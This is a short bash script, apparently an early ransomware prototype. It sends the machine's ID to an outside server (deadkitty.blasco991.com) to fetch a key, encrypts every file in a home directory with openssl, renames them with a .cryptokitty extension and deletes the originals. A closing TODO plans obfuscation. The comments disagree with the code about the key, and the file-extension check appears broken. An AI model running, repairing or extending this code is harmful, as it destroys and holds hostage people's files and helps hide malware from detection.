#for every file in the chosen directory
key=$(curl -s https://deadkitty.blasco991.com/code.php?m=$(cat /var/lib/dbus/machine-id)) && for f in /home/cavaz/prova/* /home/cavaz/prova/**/* ; do
echo $f
#i encrypt with extension .criptokitty and i use the key "pippo", then i remove the clear text files leaving only the crypted ones
[ -f "$f" ] && [[ "${f##*\\.}" == "*.cryptokitty" ]] && openssl enc -aes-256-cbc -in "$f" -k "$key" -out "$f.cryptokitty" && rm "$f"

done

#TODO make obfuscation
